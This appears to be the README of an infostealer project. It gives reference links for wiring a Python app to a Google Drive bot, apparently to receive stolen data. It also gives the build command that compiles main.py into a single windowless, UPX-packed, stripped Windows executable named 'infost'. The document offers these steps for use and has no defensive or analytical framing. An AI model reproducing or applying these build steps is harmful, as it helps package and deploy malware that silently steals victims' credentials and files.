# INFOSTEALER
----------------------------------------------------
- python env: https://coderslegacy.com/pyinstaller-virtual-environment-with-venv/
- folder id: https://robindirksen.com/blog/where-do-i-get-google-drive-folder-id
- google drive bot: https://obikastanya.medium.com/easy-way-to-integrate-your-python-apps-with-google-drive-api-2f29ed0be239
----------------------------------------------------
python -m venv [env name]
(link)
pip list
pip install -r requirements.txt

(last step - after full config - google drive)
\[env name]\Scripts\pyinstaller.exe 
--noconsole --onefile --clean
--paths '[path]\[env name]\Lib\site-packages' 
--upx-dir 'D:\Programs\UPX\upx-4.0.2-win64'  
--exclude-module altgraph 
--exclude-module colorama 
--exclude-module charset-normalizer 
--exclude-module idna 
--exclude-module zope.interface 
--exclude-module importlib-metadata 
--exclude-module install 
--exclude-module Jinja2 
--exclude-module MarkupSafe 
--exclude-module protobuf 
--exclude-module pyasn1-module 
--exclude-module pytz 
--exclude-module Werkzeug 
--exclude-module urllib3 
--exclude-module zip 
--exclude-module certifi 
--exclude-module google-auth-httplib2 
--exclude-module googleapis-common-protos  
--exclude-module google-auth 
--exclude-module google-api-core 
--exclude-module google-api-python-client 
--exclude-module pyinstaller 
--exclude-module setuptools 
--exclude-module requests 
--exclude-module pycryptodome 
--exclude-module pip 
--exclude-module Flask 
--exclude-module DateTime 
--strip 
--name infost main.py

